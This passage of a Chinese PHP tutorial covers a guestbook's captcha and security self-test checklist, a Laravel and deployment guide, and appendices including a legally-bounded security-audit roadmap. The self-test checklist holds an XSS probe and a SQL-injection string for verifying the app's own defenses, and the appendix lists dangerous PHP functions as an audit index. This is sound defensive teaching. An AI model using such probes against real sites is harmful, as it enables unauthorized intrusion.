    imagechar($img, 5, 15 + $i * 20, random_int(5, 15), $code[$i], $fg);
}
for ($i = 0; $i < 40; $i++) {                    // 噪点干扰
    imagesetpixel($img, random_int(0, 99), random_int(0, 33),
        imagecolorallocate($img, random_int(100, 255), random_int(100, 255), random_int(100, 255)));
}
header("Content-Type: image/png");
imagepng($img);
imagedestroy($img);
```

```html
<!-- 表单侧 -->
<img src="captcha.php" alt="验证码" onclick="this.src='captcha.php?'+Math.random()">
<!-- 点击刷新：加随机参数绕过缓存 -->
<input name="captcha" placeholder="输入图中数字" required>
```

```php
// 服务端校验（发言/登录分支里）
if (($_POST["captcha"] ?? "") !== ($_SESSION["captcha"] ?? "")) {
    exit("验证码错误");
}
unset($_SESSION["captcha"]);                     // 用完作废（防重放）
```

原理三件套：**答案存 Session**（不进前端）、**图片只是"内容的可视化"**、**校验后立即作废**。GD 画的是入门级（机器学习时代它挡不住 OCR，但挡得住 99% 的脚本小子）；生产级升级方向：reCAPTCHA/hCaptcha（第三方人机验证）或滑块验证服务。配套的**失败限速**（第 8 章）才是爆破防线的主力——验证码是减速带不是墙。

## 11.7 上线自测清单

- [ ] 未登录发留言 → 被踢去登录；登录后发表 → 列表即时可见（PRG 刷新不重复）；
- [ ] 注册弱密码/重名 → 错误提示；密码库中是 `$2y$...` 哈希非明文；
- [ ] 删除按钮只出现在自己的留言上；手改 URL 删别人的 → 403；
- [ ] 留言内容 `<script>alert(1)</script>` → 显示为文字不弹窗（XSS 防御生效）；
- [ ] 表单去掉 csrf 字段用 curl 提交 → 403；
- [ ] 用 `' OR 1=1 -- ` 注册用户名 → 只是注册了个怪名字（预处理生效）。

六条全绿，恭喜毕业——**你已经独立完成了带认证、带数据库、带三大安全防御的完整 Web 应用**。

### 项目文档：README 是项目的脸

第 11 章收尾的最后一块拼图——给留言板写 README.md（第 6 章模板的实装）。一份合格的 README 五段式：

```markdown
# 留言板（Guestbook）

带注册登录、CSRF 防护、PDO 持久化的极简留言板。PHP 8.2+ / MySQL 5.7+ / 无框架原生实现。

## 功能
- 注册 / 登录 / 登出（密码 bcrypt 哈希，会话固定防护）
- 发表与删除留言（CSRF 令牌 + 归属校验 + XSS 转义）
- 分页浏览（每页 10 条）

## 快速开始
1. 导入 `database.sql` 到 MySQL
2. 复制 `.env.example` 为 `.env` 并填写数据库连接
3. `composer install`
4. `php -S localhost:8000 -t public`

## 安全特性
| 威胁 | 防御 |
|------|------|
| SQL 注入 | PDO 预处理（全部查询） |
| XSS | e() 输出转义（全部渲染点） |
| CSRF | 会话令牌 + hash_equals |
| 密码泄露 | password_hash(PASSWORD_DEFAULT) |
| 会话劫持 | 登录换 ID + Cookie 三件套 |

## 目录结构
（11.6 节的树）

## License
MIT
```

写 README 的过程就是**验收过程**：快速开始写不出来 = 步骤有依赖没记录；安全特性列不全 = 有防御没想清楚。对照 Java/Python 教程的"项目文档"习惯——**代码是给机器的，README 是给未来的协作者（包括半年后的自己）的**。

## 11.8 小结

- 两表模型（users/messages + 外键）；公共底座 app.php（连接+e()+CSRF+守卫）；
- 注册 = 验证 + password_hash；登录 = verify + regenerate + PRG；
- 发言 = 登录守卫 + CSRF + 长度验证 + PRG；列表 = JOIN 查询 + 转义渲染；
- 删除 = 服务端二次校验归属（IDOR 防御）；
- MVC-lite 重构：路由、控制器、仓库、视图各司其职。

## 练习 11

1.（编程）补全 login.php（数据库验证版，含 regenerate/PRG/错误提示）。
2.（编程）给留言板加"留言条数统计"（页首显示总数，一条 SQL 的 COUNT）。
3.（编程）加"编辑自己的留言"功能（edit.php：查归属 → 表单预填 → UPDATE）。
4.（概念）MVC-lite 里"把删除链接只渲染给作者"与"delete.php 校验归属"各防什么？为什么两个都要？
5.（操作）跑通 11.7 自测清单的六条，记录每条的实测结果。

## 参考答案

**1.** 骨架：POST 时 `check_csrf()` → 按用户名 SELECT（含 password_hash）→ `password_verify` → 失败统一提示"用户名或密码错误"（防枚举）→ 成功 `session_regenerate_id(true)` + `$_SESSION["user_id"]` → PRG 跳 index.php。

**2.** 页首加：

```php
$total = (int)$GLOBALS["pdo"]->query("SELECT COUNT(*) FROM messages")->fetchColumn();
echo "共 {$total} 条留言";
```

**3.** edit.php 骨架：

```php
$user = require_login();
$id = (int)($_GET["id"] ?? 0);
$stmt = $GLOBALS["pdo"]->prepare("SELECT * FROM messages WHERE id = :id");
$stmt->execute(["id" => $id]);
$msg = $stmt->fetch();
if (!$msg || (int)$msg["user_id"] !== $user["id"]) { http_response_code(403); exit; }

// POST 分支：check_csrf() → 验长度 → UPDATE ... WHERE id（WHERE 里同时带 user_id 双保险）
// GET 分支：渲染表单，textarea 预填 <?= e($msg["content"]) ?>
```

**4.** 前端隐藏防的是"误操作"（用户体验）；服务端校验防的是"恶意绕过"（改 URL/curl 直打）。前端校验可被完全绕开，服务端校验才是安全边界——两者都要：前者是体验，后者是安全。

**5.** 略（动手项）。六条对应：认证流、密码哈希、IDOR、XSS、CSRF、SQL 注入——正是第 10 章四大漏洞 + 认证的逐一验收。

**[▲ 返回目录](#toc)**

---

<a id="h12"></a>

# 第 12 章 Laravel 导览与部署

> 本章目标：认识 Laravel——把第 11 章手写的每一层"框架化"；跑通第一个 Laravel 项目；掌握生产部署清单与 PHP 的学习终点地图。**手写留言板是读懂 Laravel 的入场券。**

---

## 12.1 Laravel：把你手写的轮子官方化

Laravel 是 PHP 生态最流行的全栈框架（对标 Java 的 Spring、Python 的 Django/FastAPI 组合）。看一张"你手写的 vs Laravel 提供的"对照表：

| 你在第 6~11 章手写的      | Laravel 对应组件                       |
| ------------------------- | -------------------------------------- |
| `App\` PSR-4 + autoload   | 已内置（Composer）                     |
| index.php match 路由      | `routes/web.php` 路由系统              |
| Auth 类（注册/登录/守卫） | 内置认证（Breeze 一条命令全套登录页）  |
| PDO 预处理 CRUD           | **Eloquent ORM**（模型即表）           |
| views/*.php 模板          | **Blade** 模板引擎（布局继承、组件）   |
| check_csrf()              | 自动 CSRF 中间件（表单指令 `@csrf`）   |
| Db.php 单例               | 服务容器 + 依赖注入（对照 Spring IoC） |
| 手写验证四步              | Form Request 校验类                    |

**框架没有新思想，只有旧思想的工程化**——第 11 章每一层你都亲手写过，Laravel 只是把它们标准化、自动化。这就是"先手写后框架"教学路线的意义。

## 12.2 十分钟跑通 Laravel

前置：Composer（第 6 章）、PHP 8.2+（phpStudy 多版本切换）、SQLite 即可起步（生产换 MySQL）。

```
composer create-project laravel/laravel myblog       # ① 创建项目（自动 composer install）
cd myblog
php artisan serve                                    # ② 启动开发服务器 http://127.0.0.1:8000
```

`artisan` 是 Laravel 的命令行工具（代码生成器大军）——手写三小时的东西一行命令生成。

### 一条命令的登录系统

```
composer require laravel/breeze --dev
php artisan breeze:install                           # 生成注册/登录/重置密码全套
php artisan migrate                                  # 建用户表（迁移系统，见下）
npm install && npm run dev                           # 前端资源（可选）
```

刷新浏览器——注册、登录、登出全有了，**且每一处都自带 CSRF 防护与正确密码哈希**（第 10 章的全部成果）。

### 你手写的概念在 Laravel 里的名字

```php
// routes/web.php —— 路由（对照手写 match($path)）
use App\Models\Message;
use Illuminate\Support\Facades\Route;

Route::get("/", function () {
    $messages = Message::orderByDesc("id")->limit(50)->get();     // Eloquent 查询
    return view("index", ["messages" => $messages]);              // 视图渲染
});

Route::post("/messages", function () {
    $data = request()->validate([                                 // 校验（自动 422）
        "content" => "required|string|max:500",
    ]);
    request()->user()->messages()->create($data);                 // 关系：当前用户发留言
    return redirect("/");                                         // PRG
});
```

```php
// app/Models/Message.php —— Eloquent 模型（对照手写 MessageRepo）
namespace App\Models;

use Illuminate\Database\Eloquent\Model;

class Message extends Model
{
    protected $fillable = ["content"];                // 白名单字段（批量赋值安全）

    public function user()                            // 关系：留言属于用户
    {
        return $this->belongsTo(User::class);
    }
}
```

```php
{{-- resources/views/index.blade.php —— Blade 模板（对照手写 foreach + e()）--}}
@extends("layouts.app")

@section("content")
    @foreach ($messages as $m)
        <p>
            <strong>{{ $m->user->username }}</strong>      {{-- {{ }} 自动转义！= e() 内置 --}}
            <small>{{ $m->created_at }}</small><br>
            {{ $m->content }}
        </p>
    @endforeach

    <form method="POST" action="/messages">
        @csrf                                             {{-- CSRF 令牌一行指令 --}}
        <textarea name="content"></textarea>
        @error("content") <p>{{ $message }}</p> @enderror
        <button>发表</button>
    </form>
@endsection
```

三段代码逐一对号：`{{ }}` 就是 Blade 版的 `e()`（自动转义）、`@csrf` 就是手写的令牌指令、`validate()` 就是手写验证四步、Eloquent 模型就是 MessageRepo、`redirect()` 就是 PRG。**你手写过的每一行安全代码，Laravel 都有官方等价物**——这就是第 10 章说"PHP 防御体系最成熟"的兑现。

### 迁移（migration）：数据库的版本控制

```php
// database/migrations/xxxx_create_messages_table.php
public function up(): void
{
    Schema::create("messages", function (Blueprint $table) {
        $table->id();                                   // 自增主键
        $table->foreignId("user_id")->constrained();    // 外键
        $table->string("content", 500);
        $table->timestamps();                           // created_at/updated_at
    });
}
```

`php artisan migrate` 建表、`php artisan migrate:rollback` 回滚——**建表 SQL 进了版本库**，团队与多环境数据库结构始终同步（对照手写 SQL 散落各处的痛）。

### Laravel 目录导览与 artisan 生成器

`laravel new` 生成的项目结构逐个认识（对照第 6 章的朴素结构，每层都有了官方归宿）：

```
myblog/
├── app/
│   ├── Http/Controllers/     ← 控制器（你的业务入口）
│   ├── Models/               ← Eloquent 模型
│   └── Providers/            ← 服务提供者（框架启动钩子）
├── database/
│   ├── migrations/           ← 建表迁移（版本控制的数据库）
│   └── seeders/              ← 假数据填充
├── resources/views/          ← Blade 模板
├── routes/
│   ├── web.php               ← 网页路由
│   └── api.php               ← API 路由（自动带 /api 前缀）
├── storage/                  ← 日志/缓存/上传文件（可写，不进 Git）
├── .env                      ← 环境配置（不进 Git，第 11 章 .env 的官方版）
└── artisan                   ← 命令行入口
```

**artisan 生成器**是 Laravel 的灵魂效率工具——代码骨架一条命令：

```
php artisan make:model Post -mfc      # -m 建迁移 -f 建工厂(假数据) -c 建控制器
php artisan make:controller PostController --resource   # 含 index/create/store...七个空方法
php artisan make:request StorePostRequest               # 表单校验类
php artisan route:list                # 列出全部已注册路由（调试利器）
php artisan tinker                    # 交互式 REPL：直接操作模型试代码
```

`tinker` 值得单独点名：`php artisan tinker` 进入后可以直接 `Message::count()`、`User::first()`——**Eloquent 查询不用写页面就能试**（对标 Python REPL 的地位）。手写 PHP 时代"改文件刷新看结果"的反馈循环，在框架时代由 `artisan serve --reload`（热重载）+ tinker + Vite 热更新接棒——**工具在变，快反馈的学习法不变**。

### opcache 与 PHP 性能两板斧

第 1 章说 PHP 每次请求重新编译文件——生产环境靠 **opcache** 把字节码缓存在共享内存，编译只做一次（性能提升数倍，php.ini 里 `opcache.enable=1`，现代环境默认开）。再配两条：

1. **composer 优化**：`composer install --optimize-autoloader --no-dev`（类映射加速 + 去掉开发依赖）；
2. **框架缓存**：Laravel 的 `config:cache / route:cache / view:cache`（把配置/路由/模板编译结果落盘，请求时直接加载）。

PHP 性能心法（对照 Java 教程 JIT、Python 教程"先测量"）：**Web 应用的瓶颈九成在数据库与网络，不在语言**——索引建对、N+1 查询消灭（Laravel 的 `with()` 预加载）、HTTP 缓存用起来，远比纠结语言快慢有效。

## 12.3 Laravel 学习路线

1. 路由 + 控制器 + Blade 视图（本周）：官方文档《Routing》《Blade Templates》；
2. Eloquent：模型、关联（belongsTo/hasMany）、查询构造器——**SQL 功底（第 9 章）直接迁移**，Eloquent 是"用对象语法写 SQL"；
3. 表单验证（Form Request）+ 中间件（middleware，对照手写 guard.php）；
4. Breeze 全套认证源码通读——**你会发现每个文件都是第 8、10 章概念的框架版**；
5. 队列（queue）、任务调度（schedule）、API（Sanctum 认证）——进阶三件。

**Laravel 不替代基础，它放大基础**：不懂 Session 的人用 Laravel 登录系统，出问题只会复制粘贴；懂第 8~10 章的人用同一套系统，是在"验收"框架替你做的事。框架是杠杆，支点必须是你自己——这也是"先手写、后框架"这条学习路线的全部理由。

### 部署故障五连查（上线当晚的救火手册）

按命中率排序的排障清单（生产环境"打不开"先查这些）：

1. **白屏/500**：`.env` 缺失或 `APP_DEBUG=false` 吞了报错 → 查 `storage/logs/laravel.log`；顺手确认 storage/ 可写；
2. **样式/图片 404**：Web 根目录没指向 `public/`，或静态资源没上传 / Vite 没跑 `npm run build`；
3. **数据库连接失败**：`.env` 的 DB_HOST（容器内外地址不同！容器里写服务名不写 127.0.0.1）、账号权限、MySQL 没起；
4. **路由全 404（首页好使）**：Nginx/Apache 没把请求重写到 index.php（Laravel 需要 try_files / mod_rewrite 配置）——前端控制器模式（第 6 章）的部署要求；
5. **权限报错**：storage/ 与 bootstrap/cache 目录 Web 进程写不了 → `chown` 给 PHP 进程用户。

通用心法：**先看日志再猜代码**——PHP 错误日志、Nginx error.log、应用日志三处轮流翻，90% 的部署故障日志里写着答案（对照第 10 章"错误不外泄但日志要全"的设计：日志是给你看的，不是给攻击者看的）。

## 12.4 生产部署清单

从"我电脑上能跑"到"服务器上稳定跑"的检查单（与 Java 教程部署清单同源）：

**环境**

- [ ] Linux 服务器 + Nginx（或 Apache）+ PHP-FPM 8.3 + MySQL；phpStudy 仅限开发
- [ ] PHP 扩展：pdo_mysql、mbstring、openssl、fileinfo（`php -m` 核对）

**应用**

- [ ] `composer install --no-dev --optimize-autoloader`（不带开发依赖）
- [ ] `.env` 配置（DB 密码、`APP_DEBUG=false`——**调试信息是情报泄露**，第 10 章）
- [ ] `php artisan migrate --force`（迁移生产库）；`php artisan config:cache route:cache view:cache`（缓存加速）
- [ ] Web 根目录指向 `public/`（第 6 章最小暴露面）
- [ ] storage/ 目录可写、其余目录只读

**安全**

- [ ] HTTPS（Let's Encrypt 免费证书）；Cookie secure 属性生效的前提
- [ ] 数据库账号最小权限（应用账号不给 DROP）
- [ ] 定期备份（mysqldump 定时任务）与 `composer audit`

**运维**

- [ ] 进程守护：`php artisan serve` 不能用于生产（单线程！）；用 PHP-FPM 常驻
- [ ] 日志轮转：Laravel 日志在 `storage/logs/`，配 logrotate
- [ ] 监控： uptime 监控 + 错误上报（Sentry 类工具）

小型项目的最简落地路径：一台 Linux VPS → 宝塔面板（类 phpStudy 的服务器版）→ 建站指 public/ → 配 HTTPS → 上线。懂了每一步原理（本章清单），面板只是省点击。

### 学习资源清单（免费为主，全亲测可信）

**文档（第一顺位）**：

- PHP 官方文档 <https://www.php.net/manual/zh/>——中文质量高，每章学完对应通读；
- Laravel 文档 <https://laravel.com/docs> 与 Laravel Bootcamp <https://bootcamp.laravel.com>——框架学习的正版教材；
- MDN（Web 基础：HTTP/HTML/CSS）——语言之外的部分在这里。

**交互练习**：

- Laravel Bootcamp（边读边写，半天一个博客雏形）；
- Exercism 的 PHP 轨（小题带导师点评）；
- phptherightway.com（《PHP 正确之道》——过时写法对照表，本教程心法的官方版）。

**视频与书**：

- Laracasts（Laravel 官方系视频，部分免费）；
- 《Modern PHP》Josh Lockhart（现代实践总纲）；
- 《PHP & MySQL: Novice to Ninja》 Kevin Yank（Web 全流程入门书）。

**社区**：Laravel China / PHP 社区（segmentfault、v2ex 的 php 标签）、GitHub 上读 Laravel 源码（Illuminate 组件是 PHP 工程化的教科书）。

选资料的世界观（本教程反复强调）：**官方文档 > 高赞书 > 博客 > 视频集锦**——PHP 生态迭代快，五年前的博客可能一半是错的，官方文档永远同步当前版本。

### Docker 一瞥：把环境装进箱子

部署清单里"环境一致"是最痛的一条（本机 8.3、服务器 7.4 的版本错位能耗一下午）。**Docker** 把"PHP 版本 + 扩展 + Web 服务器 + 配置"打包成镜像，任何机器 `docker compose up` 一条命令复原：

```yaml
# docker-compose.yml（留言板项目的最小可用版）
services:
  web:
    image: php:8.3-apache                # 官方镜像：Apache + PHP 8.3
    ports: ["8080:80"]
    volumes: ["./public:/var/www/html"]  # 代码挂载进容器
  db:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: secret
      MYSQL_DATABASE: demo
    volumes: ["dbdata:/var/lib/mysql"]
volumes:
  dbdata:
```

```
docker compose up -d         # 一条命令：Web + MySQL 全部起好
docker compose exec web php -v
```

入门阶段理解三件事即可：**① 镜像 = 冻结的环境快照，容器 = 运行中的镜像实例**；② volumes 把宿主机目录挂进容器（代码改了不用重打包）；③ 它与 Composer/venv 解决的是同一类问题——"环境可复现"，只是粒度从"包"上升到"整个操作系统"。对照 Java 教程部署清单的 Docker 条目、Python 教程"三个月路线"的 Docker 节——全系列的部署终点都是它，本书不展开，留个准确定位即可。

### 四卷收官：你现在的位置

至此本系列四卷（C / Java / Python / PHP）全部完结。站在收官点回望，四卷其实共同回答了同一个问题的四个侧面：**"计算机世界是怎么运转的？"**

- **C 卷**回答了底层：内存、指针、编译——机器的眼睛里程序长什么样；
- **Java 卷**回答了工程：类型系统、框架、JVM——企业级软件怎么组织与调优；
- **Python 卷**回答了效率：生态、脚本、自动化——想法到成品的最短路径；
- **PHP 卷（本卷）**回答了连接：HTTP、数据库、安全——网站从浏览器到磁盘的完整旅程。

四卷的毕业项目也构成一条能力链：C 的贪吃蛇（裸机逻辑）、Java 的成绩 API（企业架构）、Python 的 FastAPI 服务（快速交付）、PHP 的留言板（Web 全栈 + 安全）。**任何一个"新语言"对你而言都只是新方言**——附录 B.2 的对照表就是你的方言词典。

接下来无论去哪——深入某个框架、转向渗透测试、开始接项目、或回头啃操作系统——你都带着同一样东西：**把一个想法完整地变成"能跑、能维护、够安全"的系统的能力**。这不是四本教程能教会你的部分，但它为此铺好了全部地基。

祝代码无 bug，日志无异常，我们更高处见。

## 12.5 PHP 卷的终点与地图

回顾四条主线在你脑中合成的画面：**语言**（PHP 8 现代形态）、**工程**（Composer/PSR/项目结构）、**Web**（请求→验证→存储→响应的全链路）、**安全**（四大漏洞攻防 + 纵深防御）。终点站的路标：

- **框架深造**：Laravel 官方文档 + Laravel Bootcamp（全免费且质量极高）；进阶读 Laravel 源码（Illuminate 组件质量是 PHP 生态标杆）；
- **方向分支**：传统网站（WordPress 二开——全球四成网站的 CMS，插件生态巨大）/ API 服务（Laravel + Sanctum）/ 高并发（Swoole 常驻框架）；
- **系列交叉**：本卷的 HTTP/数据库/安全知识与 Java 卷 13 章、Python 卷 11~12 章完全同构——**换语言不换知识**，你现在用三套语言写同一个留言板都不会超过一天；
- **安全方向**：第 10 章是 Web 安全的"防御侧入门"，进攻侧（渗透测试）以合法授权为前提，学习路径见附录进阶路线。

**最后一句**：PHP 五十年（1995-今）依然是"把想法最快变成能跑的网站"的那把刀——第 11 章你握过刀柄，本章你看过了刀鞘，剩下的路是磨刀。

## 练习 12

1.（概念）把手写留言板的 5 个组成部分与 Laravel 组件连线：check_csrf()、MessageRepo、guard.php、验证四步、views/*.php。
2.（操作）本机跑通 Laravel：create-project → artisan serve → breeze:install → migrate → 注册登录全流程截图记录。
3.（编程）在 Laravel 里给留言加"删除自己的留言"路由 + 控制器方法（对比第 11 章手写版，感受差异）。
4.（概念）`APP_DEBUG=false` 为什么是生产铁律？开着会泄露什么？
5.（概念）php artisan serve 为什么不能用于生产？PHP-FPM 解决了什么问题？

## 参考答案

**1.** check_csrf() → `@csrf` 指令 + VerifyCsrfToken 中间件；MessageRepo → Eloquent Model（Message）；guard.php → auth 中间件；验证四步 → `request()->validate()` / FormRequest；views/*.php → Blade 模板。

**3.**

```php
// routes/web.php
Route::delete("/messages/{message}", function (Message $message) {
    abort_unless($message->user_id === auth()->id(), 403);   // 归属校验（IDOR 防御）
    $message->delete();
    return redirect("/");
})->middleware("auth");                                      // 守卫
```

路由模型绑定（`Message $message` 自动按 id 查）+ 中间件 + 一行归属校验——手写版 30 行缩成 6 行，但**每个安全点一个不少**。

**4.** APP_DEBUG 开启时：异常页打印完整堆栈、SQL 语句、.env 配置值（含数据库密码）、文件路径——等于把情报递给攻击者。生产必须 false 且错误进日志。

**5.** artisan serve 是单线程开发服务器，一个请求未处理完其他请求排队（相当于 Python 的 `php -S` 同款定位）。生产用 **Nginx 收请求 + PHP-FPM 进程池**处理 PHP（多进程并发、常驻内存、与 Web 服务器通过 FastCGI 协议通信）——"每个请求起新进程执行完销毁"的老模型由此变成"常驻进程池处理请求"。

**[▲ 返回目录](#toc)**

---

<a id="appendix"></a>

# 附录：排错手册 · 速查表 · 进阶路线

> 三部分：A. PHP 报错对照与排查；B. 速查表；C. 进阶路线（含安全方向）。

---

## A.1 编译/运行期报错对照

| 报错信息（典型）                                             | 意思           | 最常见原因                                                   |
| ------------------------------------------------------------ | -------------- | ------------------------------------------------------------ |
| `Parse error: syntax error, unexpected token ";"`            | 语法错         | 漏分号/括号不配对/中文标点（看上一行）                       |
| `Parse error: unclosed string`                               | 字符串未闭合   | 引号没配对；嵌套引号要转义或换单双                           |
| `Warning: Undefined array key "x"`                           | 键不存在       | 读 `$_POST["x"]` 未提交；用 `?? 默认值`                      |
| `Fatal error: Uncaught Error: Call to undefined function x()` | 函数未定义     | 拼错、扩展未启用（如 mbstring）、忘了 require autoload       |
| `Fatal error: Uncaught TypeError: add(): Argument #1 ($a) must be of type int, string given` | 类型不符       | strict_types 下传错类型；或强转                              |
| `Fatal error: Uncaught PDOException: SQLSTATE[HY000] [1049] Unknown database` | 库不存在       | 建库/检查 DSN                                                |
| `SQLSTATE[42S02]: Base table or view not found`              | 表不存在       | 表名拼错、连错库                                             |
| `SQLSTATE[23000]: Integrity constraint violation: 1048 Column 'x' cannot be null` | 约束违反       | 插了 null/重复唯一键（1062）                                 |
| `Warning: Cannot modify header information - headers already sent` | 头已发送       | header()/session_start() 前有输出（含 BOM/空行）；重构为"先处理再输出" |
| `Failed to open stream: No such file or directory`           | 文件找不到     | require 路径错；相对路径基于入口脚本                         |
| `Allowed memory size exhausted`                              | 内存耗尽       | 一次读超大文件/无限循环堆积；改流式处理                      |
| `Maximum execution time of 30 seconds exceeded`              | 超时           | 死循环、慢查询；set_time_limit 或修逻辑                      |
| `Access denied for user 'root'@'localhost'`                  | 数据库认证失败 | 密码错/phpStudy 默认 root/root                               |

## A.2 排查流程与白屏

**白屏三查**（PHP 静默失败的头号现场）：① display_errors 没开（php.ini 或页首 ini_set）；② 文件保存成了 UTF-8 **带 BOM**（文件头多出 3 字节破坏输出，VS Code 右下角改"UTF-8"重存）；③ 语法错误但 error_reporting 关闭。开了报错再看页面/日志（phpStudy 日志目录、Nginx error.log）。

**求助四件套**：完整报错（含文件行号）→ 相关代码段 → PHP 版本（`php -v`）→ 期望 vs 实际行为。删代码到最小复现的练习永远值回票价。

## A.3 常见 FAQ 与调试工具

**Q1：为什么我的 PHP 代码在浏览器里"原样显示"？**
Web 服务器没把 .php 交给 PHP 解释执行（直接双击文件 / 服务器未配置 / 内置服务器没启动）。必须通过 `http://localhost/...` 访问。

**Q2：怎么调试 PHP？**
三档：① `var_dump/print_r` + `error_log`（本章水平）；② **Xdebug**（IDE 断点调试的事实标准：phpStudy 可一键启用，VS Code 装 "PHP Debug" 扩展配 path_mappings，断点/单步/变量面板齐全——装完回不去了）；③ Laravel 的 dd()/dump()（框架内置的漂亮调试输出）。printf 调试是对的起点，Xdebug 是终点。

**Q3：include/require/include_once/require_once 四兄弟区别？**
include 失败警告继续跑；require 失败致命错误停止（**业务文件一律 require**）；`_once` 版本防重复包含（有 autoload 后用得少了）。替代方案：全部走 Composer autoload。

**Q4：`Warning: Undefined variable` 怎么根治？**
读值前初始化（`$x = null;`）、用 `?? 兜底`、模板变量由控制器显式传入。根本守则：**每个变量在使用前都该有明确的出身**。

**Q5：phpStudy 多版本 PHP 怎么切换？CLI 用哪个？**
面板"网站"里按站点切 PHP 版本（Web 生效）；命令行的 php.exe 看你的 PATH 指向哪个（`where php` 查看），要与站点版本一致时用全路径调用，如 `D:\phpstudy_pro\Extensions\php\php8.2.x\php.exe -v`。

## A.5 从 PHP 5 老代码迁移速查（读存量项目必备）

接手老项目（国内存量巨大）时的"翻译表"——老写法 → 现代等价物：

| PHP 5 老写法                 | 问题                                  | 现代等价                  |
| ---------------------------- | ------------------------------------- | ------------------------- |
| `mysql_query(...)`           | 函数 7.0 已删除（不是弃用，是没了！） | PDO 预处理                |
| `ereg / eregi / split`       | 已删除                                | `preg_match / preg_split` |
| `each()`                     | 7.2 弃用 8.0 删除                     | `foreach`                 |
| `create_function`            | 7.2 弃用（注入温床）                  | 匿名函数 / fn             |
| `CURLOPT_*` 手搓 curl        | 啰嗦                                  | guzzlehttp/guzzle         |
| 无类型声明、无可见性         | 无法静态检查                          | 补声明 + strict_types     |
| `ini_set('magic_quotes...')` | magic_quotes 5.4 已删                 | 无需（历史概念）          |

迁移策略：**先 `php -l` 全量语法检查**（7/8 对 5 代码的第一轮清洗）、跑 PHPUnit 锁住行为、再逐文件升级语法，最后 `phpstan` 收口。理解这张表，一半的"老项目没人敢动"困局就解了——**不是不能动，是没人愿意系统性地动**。

**Q6：页面输出多了一行空白/cookie 报 headers already sent，但代码没 echo？**
元凶九成是 **UTF-8 BOM**（文件开头 3 个隐形字节 EF BB BF，算"输出"）或 `<?php` 标签后的空行/纯 PHP 文件末尾多打的 `?>`。解决：VS Code 右下角把编码从"UTF-8 with BOM"改为"UTF-8"重存；纯 PHP 文件删掉结尾的 `?>`（1.4 节的规范在此回收——省略结束标签正是为了杜绝这种事故）。

**Q7：strpos 找到了却返回 false？`==` 判断也不对？**
`strpos` 返回的是**位置**（0 起始）——找到在开头返回 0，`0 == false` 为 true 被误判"没找到"。必须用严格比较：`if (strpos($s, $sub) !== false)`。这是第 2 章 `===` 守则最经典的受害案例，与 Java `indexOf` 判 `-1`、Python `find` 判 `-1` 同源（PHP 另有 `str_contains` 返回 bool，无此坑，优先用它）。

**Q8：`foreach` 里改数组元素为什么不生效？**
`foreach` 默认操作的是**副本**。要改原数组：① 引用遍历 `foreach ($arr as $k => &$v) { $v = ...; }`，**循环结束后立刻 `unset($v)`**（残留引用是经典坑）；② 或用 `array_map/array_filter` 生成新数组（现代首选）。与 Python 教程"遍历中删除"同族问题——遍历与修改分离，永远是对的。

## B.1 速查表

**输出三件套**：`echo`（语句）、`print_r($arr)`（人读）、`var_dump($x)`（类型+值，调试首选）；模板里 `<?= e($x) ?>`。

**字符串**：`strlen/mb_strlen strpos/mb_strpos substr/mb_substr str_replace str_contains str_starts_with trim explode implode sprintf number_format strtolower ucfirst htmlspecialchars password_hash password_verify json_encode/decode hash_equals bin2hex random_bytes`。

**数组**：`count sort/rsort asort/ksort in_array array_search array_keys/values merge slice reverse sum unique map/filter/reduce usort(回调 <=>) array_column($rows, "name") array_column($rows, null, "id")`（按 id 重建索引，好东西）。

**PDO**：`prepare/execute/fetch/fetchAll/rowCount/lastInsertId/query（仅无参）`；DSN 三件套 `ERRMODE_EXCEPTION / FETCH_ASSOC / EMULATE_PREPARES=false`。

**会话**：`session_start() $_SESSION unset session_destroy session_regenerate_id(true) setcookie(..., ["secure","httponly","samesite"])`。

**安全函数**：`htmlspecialchars(ENT_QUOTES, UTF-8) password_hash/verify/needs_rehash hash_equals random_bytes preg_match（u 修饰符配中文） http_response_code header("Location: ...") + exit`。

**composer**：`init require remove install update dump-autoload show audit`；国内镜像 aliyun。

**artisan**（Laravel）：`serve migrate migrate:rollback route:list make:model -mfc tinker`。

## B.2 与系列前三卷对照表

| 概念       | C        | Java                   | Python               | PHP                              |
| ---------- | -------- | ---------------------- | -------------------- | -------------------------------- |
| 类型检查   | 编译期强 | 编译期强               | 运行期动态（可注解） | 运行期弱（可声明+strict）        |
| 容器       | 数组     | List/Map               | list/dict            | **一种数组两用**                 |
| 哈希表     | 手写     | HashMap                | dict                 | 关联数组                         |
| 错误机制   | 返回值   | checked/unchecked 异常 | 全 unchecked + EAFP  | 异常体系（无 checked）+ 错误级别 |
| 字符串拼接 | 手动     | `+`                    | f-string             | `"{$x}"` 插值 / `.`              |
| Web 框架   | —        | Spring Boot            | FastAPI              | Laravel                          |
| 包管理     | 手动     | Maven                  | pip + venv           | Composer                         |
| 测试       | 手工     | JUnit                  | pytest               | PHPUnit                          |
| 部署单元   | exe/jar  | jar                    | 脚本+venv            | 目录 + PHP-FPM                   |

PHP 独有的心智锚点：**请求即进程**（无状态、无常驻内存）——前三卷的"程序是常驻的"直觉在传统 PHP Web 里不成立（Swoole 常驻框架除外）。Session 是为这个模型人造的状态（第 8 章）。

## A.4 从防御到审计：安全方向路线图（衔接你的方向）

第 10 章是"防御者视角"，如果这条线吸引你，继续的路是这样铺的（以合法授权为绝对前提）：

**阶段 1：靶场实战（1~2 月）**。本地搭 DVWA（Damn Vulnerable Web Application，PHP 写的故意漏洞靶场——第 10 章每个漏洞在里面都有真实靶位）或 bWAPP；按漏洞类型逐一打穿：注入→XSS→CSRF→文件上传→反序列化。每个漏洞写下"payload + 原理 + 防御"三段笔记。

**阶段 2：代码审计入门（2~3 月）**。白盒读源码找洞——PHP 是审计入门最友好的语言（动态弱类型的危险函数面广）：危险函数清单（`eval/system/exec/include/unserialize/$_GET 直拼 SQL`）作为索引去真实开源项目回溯调用链；工具辅助 RIPS/Scanners 类 SAST + 自己写 grep 规则。练手对象：GitHub 上小体量 PHP 项目（几 KB~几百 KB）——**第 10 章的防御清单反向使用就是审计检查表**。

**阶段 3：方法论与合规（长期）**。OWASP Testing Guide 通读、Burp Suite 实操、HTB/VulnHub 靶机；**法律红线刻在心里**：只测授权目标（SRC 平台的项目范围页就是授权书）、只做无害化验证、发现漏洞按平台流程提交。第 10 章"防御方视角 + 合法靶场实验"的设计，正是为这条路铺的第一段砖。

（对照本系列：Java 卷的工程思维、Python 卷的自动化能力、C 卷的内存原理——审计 PHP 项目时三者都会回来帮你。）

## C. 进阶路线

